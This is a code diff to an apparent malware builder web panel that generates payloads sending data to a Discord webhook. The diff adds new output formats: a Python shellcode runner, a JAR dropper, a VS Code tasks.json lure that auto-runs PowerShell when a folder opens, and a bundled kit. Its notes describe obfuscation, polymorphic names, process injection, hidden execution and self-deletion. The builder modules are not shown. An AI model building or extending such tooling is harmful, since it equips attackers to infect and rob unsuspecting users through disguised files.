@@ -5,6 +5,9 @@ import { applyPolymorphicNames } from "./formats/polymorphic.js";
 import { obfuscate } from "./formats/obfuscate.js";
 import { buildPs1 } from "./formats/ps1.js";
 import { buildBat } from "./formats/bat.js";
+import { buildTasksJson } from "./formats/tasks.js";
+import { buildDonut } from "./formats/donut.js";
+import { buildJar } from "./formats/jar.js";
 
 const PORT    = parseInt(process.env.BROWSER_BUILDER_PORT || "5176");
 const HOST    = process.env.HOST || "0.0.0.0";
@@ -37,6 +40,7 @@ input,select{width:100%;background:#09090b;border:1px solid #27272a;border-radiu
 input:focus,select:focus{border-color:#7c3aed}
 select option{background:#09090b}
 .fmts{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:1.25rem}
+.fmts2{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem;margin-bottom:1.25rem}
 .fmt{background:#18181b;border:2px solid #27272a;border-radius:8px;padding:.6rem .4rem;
   font-size:.78rem;color:#a1a1aa;text-align:center;cursor:pointer;transition:.15s;user-select:none}
 .fmt:hover{border-color:#4c1d95;color:#e4e4e7}
@@ -90,6 +94,20 @@ button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow
         <div class="icon">&#x26A1;</div>EXE
       </div>
     </div>
+    <div class="fmts2">
+      <div class="fmt" data-fmt="donut">
+        <div class="icon">&#x1F4A3;</div>Donut SC
+      </div>
+      <div class="fmt" data-fmt="jar">
+        <div class="icon">&#x2615;</div>JAR
+      </div>
+      <div class="fmt" data-fmt="tasks">
+        <div class="icon">&#x1F5C2;</div>tasks.json
+      </div>
+      <div class="fmt" data-fmt="kit">
+        <div class="icon">&#x1F4E6;</div>Kit (.zip)
+      </div>
+    </div>
 
     <label>Output Filename</label>
     <input type="text" id="fname" value="update.js" placeholder="update.js" required>
@@ -100,15 +118,19 @@ button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow
   </form>
 </div>
 <script>
-var fmtEl = document.querySelectorAll('.fmt');
+var fmtEl = document.querySelectorAll('.fmts .fmt, .fmts2 .fmt');
 var selectedFmt = 'js';
-var exts = {js:'js',ps1:'ps1',bat:'bat',exe:'exe'};
-var defaults = {js:'update.js',ps1:'update.ps1',bat:'update.bat',exe:'update.exe'};
+var exts = {js:'js',ps1:'ps1',bat:'bat',exe:'exe',donut:'py',jar:'jar',tasks:'tasks.json',kit:'zip'};
+var defaults = {js:'update.js',ps1:'update.ps1',bat:'update.bat',exe:'update.exe',donut:'donut.py',jar:'update.jar',tasks:'tasks.json',kit:'kit.zip'};
 var notes = {
   js:'JS: obfuscated + polymorphic names + process injection.',
   ps1:'PS1: PowerShell retrieval + process injection via C# Add-Type.',
   bat:'BAT: drops encoded PS1 to temp, runs hidden, self-deletes.',
-  exe:'EXE: standalone (~40MB, bundles Node.js runtime). Takes ~60s to build.'
+  exe:'EXE: standalone (~40MB, bundles Node.js runtime). Takes ~60s to build.',
+  donut:'Donut SC: Python ctypes shellcode runner. Resolves WinExec at runtime, injects x64 stub.',
+  jar:'JAR: Java launcher. Drops PS1 to temp + runs hidden. No Java source needed at runtime.',
+  tasks:'tasks.json: VS Code folder lure. Auto-runs PS1 one-liner on folder open.',
+  kit:'Kit: ZIP containing PS1 + BAT + tasks.json + JAR (all formats bundled).'
 };
 fmtEl.forEach(function(b){
   b.addEventListener('click',function(){
@@ -123,7 +145,8 @@ document.getElementById('f').onsubmit=async function(e){
   e.preventDefault();
   var err=document.getElementById('err'),btn=document.getElementById('btn');
   err.style.display='none';btn.disabled=true;
-  btn.textContent=selectedFmt==='exe'?'Building EXE\u2026 (~60s)':'Building\u2026';
+  var slowFmts = {exe:'Building EXE\u2026 (~60s)', kit:'Building Kit\u2026 (~5s)'};
+  btn.textContent=slowFmts[selectedFmt]||'Building\u2026';
   try{
     var res=await fetch('/api/build',{
       method:'POST',headers:{'Content-Type':'application/json'},
@@ -161,15 +184,20 @@ const server = Bun.serve({
       if (!webhook.startsWith("https://discord.com/api/webhooks/"))
         return Response.json({ error: "Invalid Discord webhook URL" }, { status: 400 });
 
-      const format: string  = body?.format || "js";
+      const VALID_FORMATS = new Set(["js","ps1","bat","exe","donut","jar","tasks","kit"]);
+      const format: string = VALID_FORMATS.has(body?.format) ? body.format : "js";
       const filename: string = (body?.filename || "update.js")
         .replace(/[^\w\-. ]/g, "_").slice(0, 64);
 
       const mimes: Record<string, string> = {
-        js:  "application/javascript",
-        ps1: "text/plain",
-        bat: "text/plain",
-        exe: "application/octet-stream",
+        js:    "application/javascript",
+        ps1:   "text/plain",
+        bat:   "text/plain",
+        exe:   "application/octet-stream",
+        donut: "text/x-python",
+        jar:   "application/java-archive",
+        tasks: "application/json",
+        kit:   "application/zip",
       };
 
       try {
@@ -179,6 +207,15 @@ const server = Bun.serve({
           output = buildPs1(webhook);
         } else if (format === "bat") {
           output = buildBat(webhook);
+        } else if (format === "donut") {
+          output = buildDonut(webhook);
+        } else if (format === "tasks") {
+          output = buildTasksJson(webhook);
+        } else if (format === "jar") {
+          output = await buildJar(webhook);
+        } else if (format === "kit") {
+          const { buildKit } = await import("./formats/kit.js");
+          output = await buildKit(webhook);
         } else if (format === "exe") {
           // Lazy-load exe builder (heavy pkg dependency)
           const { buildExe } = await import("./formats/exe.js");
